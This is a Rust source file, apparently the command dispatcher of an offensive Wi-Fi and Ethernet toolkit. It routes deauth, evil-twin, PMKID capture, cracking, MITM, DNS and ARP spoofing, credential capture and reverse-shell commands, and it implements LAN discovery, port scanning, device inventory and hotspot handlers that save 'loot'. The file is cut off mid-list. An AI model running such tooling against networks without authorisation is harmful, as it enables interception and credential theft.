use std::{
    collections::{HashMap, VecDeque},
    fs::{self, File},
    io::Write,
    net::Ipv4Addr,
    path::{Path, PathBuf},
    sync::{Mutex as StdMutex, OnceLock},
    time::{Duration, SystemTime, UNIX_EPOCH},
};

use anyhow::{anyhow, bail, Context, Result};
use chrono::Local;
use ipnet::Ipv4Net;
use regex::Regex;
use rustyjack_ethernet::{
    build_device_inventory, build_device_inventory_cancellable, discover_hosts, discover_hosts_arp,
    discover_hosts_arp_cancellable, discover_hosts_cancellable, quick_port_scan,
    quick_port_scan_cancellable, DeviceInfo, LanDiscoveryResult,
};
use rustyjack_evasion::{
    MacAddress, MacGenerationStrategy, MacManager, MacMode, MacPolicyConfig, MacPolicyEngine,
    MacStage, StableScope, VendorOui, VendorPolicy,
};
use rustyjack_portal::{start_portal, stop_portal, PortalConfig};
use rustyjack_wireless::{
    arp_scan, arp_scan_cancellable, calculate_bandwidth, capture_dns_queries,
    capture_dns_queries_cancellable, discover_gateway, discover_mdns_devices,
    discover_mdns_devices_cancellable, get_traffic_stats, hotspot_disconnect_client,
    hotspot_set_blacklist, scan_network_services, scan_network_services_cancellable, start_hotspot,
    status_hotspot, stop_hotspot, HotspotConfig, HotspotState,
};
use serde::Serialize;
use serde_json::{json, Map, Value};

use crate::audit::{AuditEvent, AuditResult};

#[cfg(target_os = "linux")]
use rustyjack_netlink::{TxPowerSetting, WirelessManager};
use walkdir::WalkDir;

use crate::cancel::{cancel_sleep, check_cancel, CancelFlag, CancelledError};
use crate::cli::{
    BridgeCommand, BridgeStartArgs, BridgeStopArgs, Commands, DiscordCommand, DiscordSendArgs,
    DnsSpoofCommand, DnsSpoofStartArgs, EthernetCommand, EthernetDiscoverArgs,
    EthernetInventoryArgs, EthernetPortScanArgs, EthernetSiteCredArgs, ExportLogsToUsbArgs,
    HardwareCommand, HotspotBlacklistArgs, HotspotCommand, HotspotDisconnectArgs, HotspotStartArgs,
    LootCommand, LootKind, LootListArgs, LootReadArgs, MitmCommand, MitmStartArgs, NotifyCommand,
    ProcessCommand, ProcessKillArgs, ProcessStatusArgs, ReverseCommand, ReverseLaunchArgs,
    ScanCommand, ScanDiscovery, ScanRunArgs, StatusCommand, SystemCommand, SystemConfigureHostArgs,
    SystemFdeMigrateArgs, SystemFdePrepareArgs, SystemUpdateArgs, UsbMountArgs, UsbMountMode,
    UsbUnmountArgs, WifiBestArgs, WifiCommand, WifiCrackArgs, WifiDeauthArgs, WifiDisconnectArgs,
    WifiEvilTwinArgs, WifiKarmaArgs, WifiMacRandomizeArgs, WifiMacRestoreArgs, WifiMacSetArgs,
    WifiMacSetVendorArgs, WifiPipelinePreflightArgs, WifiPmkidArgs, WifiProbeSniffArgs,
    WifiProfileCommand, WifiProfileConnectArgs, WifiProfileDeleteArgs, WifiProfileSaveArgs,
    WifiProfileShowArgs, WifiReconArpScanArgs, WifiReconBandwidthArgs, WifiReconCommand,
    WifiReconDnsCaptureArgs, WifiReconGatewayArgs, WifiReconMdnsScanArgs, WifiReconServiceScanArgs,
    WifiRouteCommand, WifiRouteEnsureArgs, WifiRouteMetricArgs, WifiScanArgs, WifiStatusArgs,
    WifiSwitchArgs, WifiTxPowerArgs,
};
use crate::mount::{MountMode, MountPolicy, MountRequest, UnmountRequest};
#[cfg(target_os = "linux")]
use crate::netlink_helpers::netlink_set_interface_up;
use crate::system::{
    acquire_dhcp_lease, active_uplink, append_payload_log, apply_interface_isolation_strict,
    arp_spoof_running, backup_routing_state, build_manual_embed, build_mitm_pcap_path,
    build_scan_loot_path, cached_gateway, compose_status_text, connect_wifi_network,
    default_gateway_ip, delete_wifi_profile, detect_ethernet_interface, detect_interface,
    disconnect_wifi_interface, dns_spoof_running, enable_ip_forwarding, enforce_single_interface,
    find_interface_by_mac, interface_gateway, kill_process, last_dhcp_outcome, lease_record,
    list_interface_summaries, list_wifi_profiles, load_wifi_profile, log_mac_usage,
    pcap_capture_running, ping_host, preferred_interface, process_running_exact,
    randomize_hostname, read_default_route, read_discord_webhook, read_dns_servers,
    read_interface_preference, read_interface_preference_with_mac, read_interface_stats,
    read_wifi_link_info, restore_routing_state, sanitize_label, save_wifi_profile,
    scan_local_hosts_cancellable, scan_wifi_networks_with_timeout_cancel, select_active_uplink,
    select_best_interface, select_wifi_interface, send_discord_payload, send_scan_to_discord,
    set_interface_metric, spawn_arpspoof_pair, start_bridge_pair, start_dns_spoof,
    start_pcap_capture, stop_arp_spoof, stop_bridge_pair, stop_dns_spoof, stop_pcap_capture,
    write_interface_preference, write_wifi_profile, HostInfo, IsolationPolicyGuard, KillResult,
    LootSession, WifiProfile,
};

pub type HandlerResult = (String, Value);

pub fn is_cancelled_error(err: &anyhow::Error) -> bool {
    for cause in err.chain() {
        if cause.is::<CancelledError>() {
            return true;
        }
        if let Some(wireless) = cause.downcast_ref::<rustyjack_wireless::WirelessError>() {
            if matches!(wireless, rustyjack_wireless::WirelessError::Cancelled) {
                return true;
            }
        }
        if cause.is::<rustyjack_ethernet::CancelledError>() {
            return true;
        }
    }
    false
}

static HOTSPOT_POLICY_GUARD: OnceLock<StdMutex<Option<IsolationPolicyGuard>>> = OnceLock::new();

fn get_active_interface(root: &Path) -> Result<Option<String>> {
    use crate::system::PreferenceManager;
    let prefs = PreferenceManager::new(root.to_path_buf());
    prefs.get_preferred()
}

pub fn set_active_interface(
    root: &Path,
    iface: &str,
) -> Result<crate::system::ops::IsolationOutcome> {
    use crate::system::interface_selection::select_interface;

    let selection = select_interface(
        root.to_path_buf(),
        iface,
        None::<&mut fn(&str, u8, &str)>,
        None,
    )?;

    Ok(crate::system::ops::IsolationOutcome {
        allowed: selection.allowed,
        blocked: selection.blocked,
        errors: selection.errors,
    })
}

fn store_hotspot_policy_guard(guard: IsolationPolicyGuard) -> Result<()> {
    let lock = HOTSPOT_POLICY_GUARD.get_or_init(|| StdMutex::new(None));
    let mut slot = lock.lock().unwrap_or_else(|e| e.into_inner());
    if slot.is_some() {
        bail!("Hotspot isolation policy already set");
    }
    *slot = Some(guard);
    Ok(())
}

fn clear_hotspot_policy_guard() {
    if let Some(lock) = HOTSPOT_POLICY_GUARD.get() {
        let mut slot = lock.lock().unwrap_or_else(|e| e.into_inner());
        slot.take();
    }
}

#[allow(dead_code)]
fn validate_and_enforce_interface(
    root: &Path,
    requested: Option<&str>,
    allow_multi: bool,
) -> Result<String> {
    let active = match get_active_interface(root)? {
        Some(active) => Some(active),
        None => Some(preferred_interface()?),
    };

    match (requested, active.as_deref()) {
        (Some(req), Some(act)) if req != act && !allow_multi => {
            bail!(
                "Interface mismatch: requested '{}' but active interface is '{}'. Use 'wifi route ensure' to switch.",
                req,
                act
            );
        }
        (Some(req), _) => {
            if !allow_multi {
                enforce_single_interface(req)?;
            }
            Ok(req.to_string())
        }
        (None, Some(act)) => {
            if !allow_multi {
                enforce_single_interface(&act)?;
            }
            Ok(act.to_string())
        }
        (None, None) => {
            bail!("No active interface set. Run 'hardware detect' and 'wifi route ensure' first.");
        }
    }
}

pub fn dispatch_command(root: &Path, command: Commands) -> Result<HandlerResult> {
    dispatch_command_with_cancel(root, command, None)
}

pub fn dispatch_command_with_cancel(
    root: &Path,
    command: Commands,
    cancel: Option<&CancelFlag>,
) -> Result<HandlerResult> {
    check_cancel(cancel)?;
    match command {
        Commands::Scan(ScanCommand::Run(args)) => handle_scan_run(root, args),
        Commands::Notify(NotifyCommand::Discord(sub)) => match sub {
            DiscordCommand::Send(args) => handle_discord_send(root, args),
            DiscordCommand::Status => handle_discord_status(root),
        },
        Commands::Mitm(sub) => match sub {
            MitmCommand::Start(args) => handle_mitm_start(root, args, cancel),
            MitmCommand::Stop => handle_mitm_stop(),
        },
        Commands::DnsSpoof(sub) => match sub {
            DnsSpoofCommand::Start(args) => handle_dnsspoof_start(root, args),
            DnsSpoofCommand::Stop => handle_dnsspoof_stop(),
        },
        Commands::Wifi(sub) => match sub {
            WifiCommand::List => handle_wifi_list(),
            WifiCommand::Status(args) => handle_wifi_status(root, args),
            WifiCommand::Best(args) => handle_wifi_best(root, args),
            WifiCommand::Switch(args) => handle_wifi_switch(root, args),
            WifiCommand::MacRandomize(args) => handle_wifi_mac_randomize(args),
            WifiCommand::MacSetVendor(args) => handle_wifi_mac_set_vendor(args),
            WifiCommand::MacSet(args) => handle_wifi_mac_set(args),
            WifiCommand::MacRestore(args) => handle_wifi_mac_restore(args),
            WifiCommand::TxPower(args) => handle_wifi_tx_power(args),
            WifiCommand::Scan(args) => handle_wifi_scan(root, args, cancel),
            WifiCommand::Profile(profile) => match profile {
                WifiProfileCommand::List => handle_wifi_profile_list(root),
                WifiProfileCommand::Show(args) => handle_wifi_profile_show(root, args),
                WifiProfileCommand::Save(args) => handle_wifi_profile_save(root, args),
                WifiProfileCommand::Connect(args) => handle_wifi_profile_connect(root, args),
                WifiProfileCommand::Delete(args) => handle_wifi_profile_delete(root, args),
            },
            WifiCommand::Disconnect(args) => handle_wifi_disconnect(args),
            WifiCommand::Route(route) => match route {
                WifiRouteCommand::Status => handle_wifi_route_status(root),
                WifiRouteCommand::Ensure(args) => handle_wifi_route_ensure(root, args),
                WifiRouteCommand::Backup => handle_wifi_route_backup(root),
                WifiRouteCommand::Restore => handle_wifi_route_restore(root),
                WifiRouteCommand::SetMetric(args) => handle_wifi_route_metric(args),
            },
            WifiCommand::Deauth(args) => handle_wifi_deauth(root, args, cancel),
            WifiCommand::EvilTwin(args) => handle_wifi_evil_twin(root, args, cancel),
            WifiCommand::PmkidCapture(args) => handle_wifi_pmkid(root, args, cancel),
            WifiCommand::ProbeSniff(args) => handle_wifi_probe_sniff(root, args, cancel),
            WifiCommand::Crack(args) => handle_wifi_crack(root, args, cancel),
            WifiCommand::Karma(args) => handle_wifi_karma(root, args, cancel),
            WifiCommand::PipelinePreflight(args) => handle_wifi_pipeline_preflight(root, args),
            WifiCommand::Recon(recon) => match recon {
                WifiReconCommand::Gateway(args) => handle_wifi_recon_gateway(args, cancel),
                WifiReconCommand::ArpScan(args) => handle_wifi_recon_arp_scan(args, cancel),
                WifiReconCommand::ServiceScan(args) => handle_wifi_recon_service_scan(args, cancel),
                WifiReconCommand::MdnsScan(args) => handle_wifi_recon_mdns_scan(args, cancel),
                WifiReconCommand::Bandwidth(args) => handle_wifi_recon_bandwidth(args, cancel),
                WifiReconCommand::DnsCapture(args) => handle_wifi_recon_dns_capture(args, cancel),
            },
        },
        Commands::Loot(sub) => match sub {
            LootCommand::List(args) => handle_loot_list(root, args),
            LootCommand::Read(args) => handle_loot_read(root, args),
        },
        Commands::Process(sub) => match sub {
            ProcessCommand::Kill(args) => handle_process_kill(args),
            ProcessCommand::Status(args) => handle_process_status(args),
        },
        Commands::Status(StatusCommand::Summary) => handle_status_summary(),
        Commands::Status(StatusCommand::Network) => handle_network_status(),
        Commands::Reverse(ReverseCommand::Launch(args)) => handle_reverse_launch(root, args),
        Commands::System(SystemCommand::Update(args)) => handle_system_update(root, args),
        Commands::System(SystemCommand::RandomizeHostname) => handle_randomize_hostname(),
        Commands::System(SystemCommand::ConfigureHost(args)) => handle_system_configure_host(args),
        Commands::System(SystemCommand::FdePrepare(args)) => handle_system_fde_prepare(root, args),
        Commands::System(SystemCommand::FdeMigrate(args)) => handle_system_fde_migrate(root, args),
        Commands::System(SystemCommand::Reboot) => handle_system_reboot(),
        Commands::System(SystemCommand::Poweroff) => handle_system_poweroff(),
        Commands::System(SystemCommand::Purge) => handle_system_purge(root),
        Commands::System(SystemCommand::UsbMount(args)) => handle_system_usb_mount(root, args),
        Commands::System(SystemCommand::UsbUnmount(args)) => handle_system_usb_unmount(root, args),
        Commands::System(SystemCommand::ExportLogsToUsb(args)) => {
            handle_system_export_logs_to_usb(root, args)
        }
        Commands::Bridge(sub) => match sub {
            BridgeCommand::Start(args) => handle_bridge_start(root, args),
            BridgeCommand::Stop(args) => handle_bridge_stop(root, args),
        },

        Commands::Hardware(cmd) => match cmd {
            HardwareCommand::Detect => handle_hardware_detect(),
        },
        Commands::Ethernet(sub) => match sub {
            EthernetCommand::Discover(args) => handle_eth_discover(root, args, cancel),
            EthernetCommand::PortScan(args) => handle_eth_port_scan(root, args, cancel),
            EthernetCommand::Inventory(args) => handle_eth_inventory(root, args, cancel),
            EthernetCommand::SiteCredCapture(args) => {
                handle_eth_site_cred_capture(root, args, cancel)
            }
        },
        Commands::Hotspot(sub) => match sub {
            HotspotCommand::Start(args) => handle_hotspot_start(root, args),
            HotspotCommand::Stop => handle_hotspot_stop(),
            HotspotCommand::Status => handle_hotspot_status(),
            HotspotCommand::DisconnectClient(args) => handle_hotspot_disconnect(args),
            HotspotCommand::SetBlacklist(args) => handle_hotspot_set_blacklist(args),
        },
    }
}

fn handle_scan_run(root: &Path, args: ScanRunArgs) -> Result<HandlerResult> {
    if !offensive_review_approved(root) {
        let mut errors = Vec::new();
        let warnings = Vec::new();
        if let Some(ref iface) = args.interface {
            let sys = Path::new("/sys/class/net").join(iface);
            if !sys.exists() {
                errors.push(format!("Interface {} not found", iface));
            }
        }
        if let Some(ref target) = args.target {
            if target.parse::<Ipv4Net>().is_err() {
                errors.push(format!("Invalid target CIDR: {}", target));
            }
        }
        let checks = json!({
            "label": args.label,
            "interface": args.interface,
            "target": args.target,
            "ports": args.ports,
            "top_ports": args.top_ports,
            "timeout_ms": args.timeout_ms,
            "discovery": format!("{:?}", args.discovery),
            "no_discovery": args.no_discovery,
        });
        return preflight_only_response(
            root,
            crate::audit::operations::SCAN_RUN,
            checks,
            errors,
            warnings,
        );
    }
    run_scan_with_progress(root, args, None, |_, _| {})
}

#[cfg(target_os = "linux")]
fn run_arp_discovery(
    interface: &str,
    net: Ipv4Net,
    rate_limit_pps: Option<u32>,
    timeout: Duration,
    cancel: Option<&CancelFlag>,
) -> Result<LanDiscoveryResult> {
    if let Some(flag) = cancel {
        check_cancel(Some(flag))?;
        match tokio::runtime::Handle::try_current() {
            Ok(handle) => handle.block_on(async {
                discover_hosts_arp_cancellable(interface, net, rate_limit_pps, timeout, flag).await
            }),
            Err(_) => {
                let rt = crate::runtime::shared_runtime()
                    .context("using shared tokio runtime for ARP")?;
                rt.block_on(async {
                    discover_hosts_arp_cancellable(interface, net, rate_limit_pps, timeout, flag)
                        .await
                })
            }
        }
    } else {
        match tokio::runtime::Handle::try_current() {
            Ok(handle) => handle.block_on(async {
                discover_hosts_arp(interface, net, rate_limit_pps, timeout).await
            }),
            Err(_) => {
                let rt = crate::runtime::shared_runtime()
                    .context("using shared tokio runtime for ARP")?;
                rt.block_on(async {
                    discover_hosts_arp(interface, net, rate_limit_pps, timeout).await
                })
            }
        }
    }
}

#[cfg(not(target_os = "linux"))]
fn run_arp_discovery(
    interface: &str,
    net: Ipv4Net,
    rate_limit_pps: Option<u32>,
    timeout: Duration,
    cancel: Option<&CancelFlag>,
) -> Result<LanDiscoveryResult> {
    check_cancel(cancel)?;
    discover_hosts_arp(interface, net, rate_limit_pps, timeout)
}

fn handle_eth_discover(
    root: &Path,
    args: EthernetDiscoverArgs,
    cancel: Option<&CancelFlag>,
) -> Result<HandlerResult> {
    let interface = detect_ethernet_interface(args.interface.clone())?;

    enforce_single_interface(&interface.name)?;
    check_cancel(cancel)?;

    let cidr = args
        .target
        .clone()
        .unwrap_or_else(|| interface.network_cidr());
    let net: Ipv4Net = cidr.parse().context("parsing target CIDR")?;

    let timeout = Duration::from_millis(args.timeout_ms.max(50));
    let mut hosts_detail = Vec::new();
    match run_arp_discovery(&interface.name, net, Some(50), timeout, cancel) {
        Ok(arp_result) => hosts_detail.extend(arp_result.details),
        Err(err) => {
            if is_cancelled_error(&err) {
                return Err(err);
            }
        }
    }
    check_cancel(cancel)?;
    if let Some(flag) = cancel {
        match discover_hosts_cancellable(net, timeout, flag) {
            Ok(icmp_result) => hosts_detail.extend(icmp_result.details),
            Err(err) => {
                if is_cancelled_error(&err) {
                    return Err(err);
                }
            }
        }
    } else if let Ok(icmp_result) = discover_hosts(net, timeout) {
        hosts_detail.extend(icmp_result.details);
    }
    let mut seen = std::collections::HashSet::new();
    let mut deduped = Vec::new();
    for h in hosts_detail {
        if seen.insert(h.ip) {
            deduped.push(h);
        }
    }
    let hosts: Vec<Ipv4Addr> = deduped.iter().map(|h| h.ip).collect();

    let loot_dir = root.join("loot").join("Ethernet");
    fs::create_dir_all(&loot_dir).context("creating loot/Ethernet")?;
    let timestamp = Local::now().format("%Y%m%d_%H%M%S");
    let file = loot_dir.join(format!("discovery_{}_{}.txt", net, timestamp));
    let mut out = String::new();
    out.push_str(&format!("LAN Discovery on {}\n", net));
    out.push_str(&format!("Interface: {}\n", interface.name));
    out.push_str(&format!("Timeout: {:?}\n", timeout));
    out.push_str("\nHosts:\n");
    for host in &deduped {
        let ttl_txt = host.ttl.map(|t| format!(" ttl={}", t)).unwrap_or_default();
        let os_guess = rustyjack_ethernet::guess_os_from_ttl(host.ttl)
            .map(|s| format!(" os={}", s))
            .unwrap_or_default();
        let method = match host.method {
            rustyjack_ethernet::DiscoveryMethod::Icmp => "icmp",
            rustyjack_ethernet::DiscoveryMethod::Arp => "arp",
        };
        out.push_str(&format!(
            "{} [{}]{}{}\n",
            host.ip, method, ttl_txt, os_guess
        ));
    }
    fs::write(&file, out).with_context(|| format!("writing {}", file.display()))?;

    let _ = log_mac_usage(
        root,
        &interface.name,
        "ethernet_discover",
        Some(&sanitize_label(&net.to_string())),
    );

    let log_file = write_scoped_log(
        root,
        "Ethernet",
        &net.to_string(),
        "Discovery",
        "discovery",
        &[
            format!("LAN discovery on {}", net),
            format!("Interface: {}", interface.name),
            format!("Timeout: {:?}", timeout),
            format!("Hosts found: {}", hosts.len()),
            format!("Output: {}", file.display()),
        ],
    )
    .map(|p| p.display().to_string());

    let data = json!({
        "network": net.to_string(),
        "interface": interface.name,
        "hosts_found": hosts,
        "hosts_detail": deduped.iter().map(|h| {
            json!({
                "ip": h.ip.to_string(),
                "method": match h.method {
                    rustyjack_ethernet::DiscoveryMethod::Icmp => "icmp",
                    rustyjack_ethernet::DiscoveryMethod::Arp => "arp",
                },
                "ttl": h.ttl,
                "os_guess": rustyjack_ethernet::guess_os_from_ttl(h.ttl),
            })
        }).collect::<Vec<_>>(),
        "loot_path": file.display().to_string(),
        "log_file": log_file,
    });
    Ok((
        format!("LAN discovery complete ({} hosts)", hosts.len()),
        data,
    ))
}

fn handle_eth_port_scan(
    root: &Path,
    args: EthernetPortScanArgs,
    cancel: Option<&CancelFlag>,
) -> Result<HandlerResult> {
    let interface = detect_ethernet_interface(args.interface.clone())?;
    let target: std::net::Ipv4Addr = if let Some(t) = args.target.as_ref() {
        t.parse().context("parsing target IPv4")?
    } else if let Some(gw) = interface_gateway(&interface.name)? {
        gw
    } else {
        bail!("No target provided and no gateway found");
    };

    let ports: Vec<u16> = if let Some(list) = args.ports.as_ref() {
        list.split(',')
            .filter_map(|p| p.trim().parse::<u16>().ok())
            .collect()
    } else {
        vec![
            22, 80, 443, 53, 445, 3389, 8080, 8000, 8443, 21, 23, 25, 110, 143,
        ]
    };

    if ports.is_empty() {
        bail!("No ports provided for scan");
    }

    check_cancel(cancel)?;
    let timeout = Duration::from_millis(args.timeout_ms.max(50));
    let result = if let Some(flag) = cancel {
        quick_port_scan_cancellable(target, &ports, timeout, flag).context("running port scan")?
    } else {
        quick_port_scan(target, &ports, timeout).context("running port scan")?
    };

    // Save loot
    let loot_dir = root.join("loot").join("Ethernet");
    fs::create_dir_all(&loot_dir).context("creating loot/Ethernet")?;
    let timestamp = Local::now().format("%Y%m%d_%H%M%S");
    let file = loot_dir.join(format!("portscan_{}_{}.txt", target, timestamp));
    let mut out = String::new();
    out.push_str(&format!("Port scan on {}\n", target));
    out.push_str(&format!("Timeout: {:?}\n", timeout));
    out.push_str("Ports tested:\n");
    out.push_str(&format!("{:?}\n\n", ports));
    out.push_str("Open ports:\n");
    for p in &result.open_ports {
        out.push_str(&format!("{}\n", p));
    }
    if !result.banners.is_empty() {
        out.push_str("\nBanners:\n");
        for b in &result.banners {
            out.push_str(&format!("{} [{}]: {}\n", b.port, b.probe, b.banner));
        }
    }
    fs::write(&file, out).with_context(|| format!("writing {}", file.display()))?;

    let _ = log_mac_usage(
        root,
        &interface.name,
        "ethernet_portscan",
        Some(&sanitize_label(&target.to_string())),
    );

    let data = json!({
        "target": target.to_string(),
        "open_ports": result.open_ports,
        "banners": result.banners.iter().map(|b| {
            json!({
                "port": b.port,
                "probe": b.probe,
                "banner": b.banner,
            })
        }).collect::<Vec<_>>(),
        "loot_path": file.display().to_string(),
    });
    let log_file = write_scoped_log(
        root,
        "Ethernet",
        &target.to_string(),
        "PortScan",
        "portscan",
        &[
            format!("Port scan on {}", target),
            format!("Interface: {}", interface.name),
            format!("Timeout: {:?} per port", timeout),
            format!("Ports tested: {}", ports.len()),
            format!("Open ports: {}", result.open_ports.len()),
        ],
    )
    .map(|p| p.display().to_string());
    let data = {
        let mut base = data;
        if let Some(log) = log_file {
            base.as_object_mut()
                .map(|obj| obj.insert("log_file".to_string(), json!(log)));
        }
        base
    };
    Ok((
        format!("Port scan complete ({} open)", result.open_ports.len()),
        data,
    ))
}

fn handle_eth_inventory(
    root: &Path,
    args: EthernetInventoryArgs,
    cancel: Option<&CancelFlag>,
) -> Result<HandlerResult> {
    let interface = detect_ethernet_interface(args.interface.clone())?;
    let cidr = args
        .target
        .clone()
        .unwrap_or_else(|| interface.network_cidr());
    let net: Ipv4Net = cidr.parse().context("parsing target CIDR")?;

    let timeout = Duration::from_millis(args.timeout_ms.max(200));
    check_cancel(cancel)?;

    // Combine ARP and ICMP to find hosts
    let mut details = Vec::new();
    match run_arp_discovery(&interface.name, net, Some(50), timeout, cancel) {
        Ok(arp) => details.extend(arp.details),
        Err(err) => {
            if is_cancelled_error(&err) {
                return Err(err);
            }
        }
    }
    check_cancel(cancel)?;
    if let Some(flag) = cancel {
        match discover_hosts_cancellable(net, timeout, flag) {
            Ok(icmp) => {
                for d in icmp.details {
                    if !details.iter().any(|h| h.ip == d.ip) {
                        details.push(d);
                    }
                }
            }
            Err(err) => {
                if is_cancelled_error(&err) {
                    return Err(err);
                }
            }
        }
    } else if let Ok(icmp) = discover_hosts(net, timeout) {
        for d in icmp.details {
            if !details.iter().any(|h| h.ip == d.ip) {
                details.push(d);
            }
        }
    }
    let hosts: Vec<Ipv4Addr> = details
        .iter()
        .map(|d| d.ip)
        .collect::<std::collections::HashSet<_>>()
        .into_iter()
        .collect();

    let discovery = LanDiscoveryResult {
        network: net,
        hosts: hosts.clone(),
        details: details.clone(),
    };

    let default_ports = vec![22, 80, 443, 445, 139, 3389, 53, 8080, 8000, 8443];
    let devices = if let Some(flag) = cancel {
        build_device_inventory_cancellable(&discovery, &default_ports, timeout, flag)?
    } else {
        build_device_inventory(&discovery, &default_ports, timeout)?
    };

    // Save loot under per-network directory
    let target_name = net
        .to_string()
        .replace(|c: char| !c.is_alphanumeric() && c != '-' && c != '_', "_");
    let loot_dir = root.join("loot").join("Ethernet").join(&target_name);
    fs::create_dir_all(&loot_dir).context("creating loot/Ethernet")?;
    let timestamp = chrono::Local::now().format("%Y%m%d_%H%M%S");
    let path = loot_dir.join(format!("inventory_{}.json", timestamp));

    let serializable: Vec<Value> = devices
        .iter()
        .map(|d| {
            json!({
                "ip": d.ip.to_string(),
                "hostname": d.hostname,
                "os_hint": d.os_hint,
                "ttl": d.ttl,
                "open_ports": d.open_ports,
                "banners": d.banners.iter().map(|b| {
                    json!({
                        "port": b.port,
                        "probe": b.probe,
                        "banner": b.banner,
                    })
                }).collect::<Vec<_>>(),
                "services": d.services.iter().map(|s| {
                    json!({
                        "protocol": s.protocol,
                        "detail": s.detail,
                    })
                }).collect::<Vec<_>>(),
            })
        })
        .collect();

    let log_file = write_scoped_log(
        root,
        "Ethernet",
        &net.to_string(),
        "Inventory",
        "inventory",
        &[
            format!("Inventory on {}", net),
            format!("Interface: {}", interface.name),
            format!("Hosts discovered: {}", hosts.len()),
            format!("Devices profiled: {}", devices.len()),
            format!("Output: {}", path.display()),
        ],
    )
    .map(|p| p.display().to_string());

    let output = json!({
        "interface": interface.name,
        "network": net.to_string(),
        "hosts_found": hosts.len(),
        "devices": serializable,
        "loot_file": path.display().to_string(),
        "log_file": log_file,
    });

    fs::write(&path, serde_json::to_vec_pretty(&serializable)?)
        .with_context(|| format!("writing {}", path.display()))?;

    let _ = log_mac_usage(
        root,
        &interface.name,
        "ethernet_inventory",
        Some(&sanitize_label(&net.to_string())),
    );

    Ok((
        format!("Inventory complete ({} device(s))", devices.len()),
        output,
    ))
}

fn handle_hotspot_start(root: &Path, args: HotspotStartArgs) -> Result<HandlerResult> {
    tracing::info!(
        "[CORE] Hotspot start requested ap_interface={} upstream_interface={} ssid={} channel={}",
        args.ap_interface,
        args.upstream_interface,
        args.ssid,
        args.channel
    );

    let cfg = HotspotConfig {
        ap_interface: args.ap_interface.clone(),
        upstream_interface: args.upstream_interface.clone(),
        ssid: args.ssid,
        password: args.password,
        channel: args.channel,
        restore_nm_on_stop: args.restore_nm_on_stop,
    };

    let mut allowed_interfaces = vec![args.ap_interface.clone()];
    if !args.upstream_interface.is_empty() {
        allowed_interfaces.push(args.upstream_interface.clone());
    }

    let session = format!(
        "hotspot_{}_{}",
        Local::now().format("%Y%m%d_%H%M%S"),
        format!("{:04x}", rand::random::<u16>())
    );
    let guard = IsolationPolicyGuard::set_allow_list(
        root.to_path_buf(),
        allowed_interfaces.clone(),
        session,
    )?;
    store_hotspot_policy_guard(guard)?;

    if let Err(e) = apply_interface_isolation_strict(&allowed_interfaces) {
        clear_hotspot_policy_guard();
        return Err(e);
    }

    // Start hotspot (it handles interface configuration and rfkill)
    let state = match start_hotspot(cfg).context("starting hotspot") {
        Ok(state) => state,
        Err(e) => {
            clear_hotspot_policy_guard();
            return Err(e);
        }
    };

    let preferred_iface = if !args.upstream_interface.is_empty() {
        args.upstream_interface.clone()
    } else {
        args.ap_interface.clone()
    };
    if !preferred_iface.is_empty() {
        let _ = write_interface_preference(root, "system_preferred", &preferred_iface);
    }

    if let Err(e) = apply_interface_isolation_strict(&allowed_interfaces) {
        let _ = stop_hotspot();
        clear_hotspot_policy_guard();
        bail!("Interface isolation failed after hotspot start: {}", e);
    }

    tracing::info!(
        "[CORE] Hotspot start completed running=true ap={} upstream={}",
        state.ap_interface,
        state.upstream_interface
    );

    let data = json!({
        "running": true,
        "ssid": state.ssid,
        "password": state.password,
        "ap_interface": state.ap_interface,
        "upstream_interface": state.upstream_interface,
        "channel": state.channel,
        "upstream_ready": state.upstream_ready,
        "nm_unmanaged": state.nm_unmanaged,
        "nm_error": state.nm_error,
        "restore_nm_on_stop": state.restore_nm_on_stop,
        "isolation_enforced": true,
        "interfaces_allowed": allowed_interfaces,
    });
    Ok(("Hotspot started".to_string(), data))
}

fn handle_hotspot_stop() -> Result<HandlerResult> {
    tracing::info!("[CORE] Hotspot stop requested");
    stop_hotspot().context("stopping hotspot")?;
    clear_hotspot_policy_guard();
    let data = json!({ "running": false });
    tracing::info!("[CORE] Hotspot stop completed");
    Ok(("Hotspot stopped".to_string(), data))
}

fn handle_hotspot_status() -> Result<HandlerResult> {
    tracing::debug!("[CORE] Hotspot status requested");
    if let Some(HotspotState {
        ssid,
        password,
        ap_interface,
        upstream_interface,
        channel,
        upstream_ready,
        nm_unmanaged,
        nm_error,
        restore_nm_on_stop,
        ..
    }) = status_hotspot()
    {
        tracing::debug!(
            "[CORE] Hotspot status running ap={} upstream={}",
            ap_interface,
            upstream_interface
        );
        let data = json!({
            "running": true,
            "ssid": ssid,
            "password": password,
            "ap_interface": ap_interface,
            "upstream_interface": upstream_interface,
            "channel": channel,
            "upstream_ready": upstream_ready,
            "nm_unmanaged": nm_unmanaged,
            "nm_error": nm_error,
            "restore_nm_on_stop": restore_nm_on_stop,
        });
        Ok(("Hotspot running".to_string(), data))
    } else {
        tracing::debug!("[CORE] Hotspot status not running");
        let data = json!({ "running": false });
        Ok(("Hotspot not running".to_string(), data))
    }
}

fn handle_hotspot_disconnect(args: HotspotDisconnectArgs) -> Result<HandlerResult> {
    #[cfg(not(target_os = "linux"))]
    {
        let _ = args;
        bail!("Hotspot client disconnect supported on Linux targets only");
    }

    #[cfg(target_os = "linux")]
    {
        if args.mac.trim().is_empty() {
            bail!("Client MAC is required");
        }
        hotspot_disconnect_client(&args.mac).context("disconnecting hotspot client")?;
        let data = json!({ "mac": args.mac });
        Ok(("Hotspot client disconnected".to_string(), data))
    }
}

fn handle_hotspot_set_blacklist(args: HotspotBlacklistArgs) -> Result<HandlerResult> {
    #[cfg(not(target_os = "linux"))]
    {
        let _ = args;
        bail!("Hotspot blacklist supported on Linux targets only");
    }

    #[cfg(target_os = "linux")]
    {
        let count = args.macs.len();
        let macs = args.macs;
        hotspot_set_blacklist(&macs).context("setting hotspot blacklist")?;
        let data = json!({ "count": count, "macs": macs });
        Ok(("Hotspot blacklist updated".to_string(), data))
    }
}

const DEFAULT_SCAN_PORTS: &[u16] = &[
    20, 21, 22, 23, 25, 26, 37, 53, 67, 68, 69, 79, 80, 81, 82, 83, 84, 85, 88, 110, 111, 113, 119,
    123, 135, 137, 138, 139, 143, 161, 162, 179, 199, 389, 443, 445, 465, 514, 515, 543, 544, 548,
    554, 587, 631, 636, 873, 902, 989, 990, 993, 995, 1025, 1026, 1027, 1028, 1029, 1030, 1110,
    1433, 1720, 1723, 1755, 1900, 2000, 2001, 2002, 2049, 2082, 2083, 2100, 2222, 2301, 2381, 2483,
    2484, 3128, 3306, 3389, 3690, 4444, 4567, 5000, 5001, 5060, 5061, 5432, 5631, 5900, 5985, 5986,
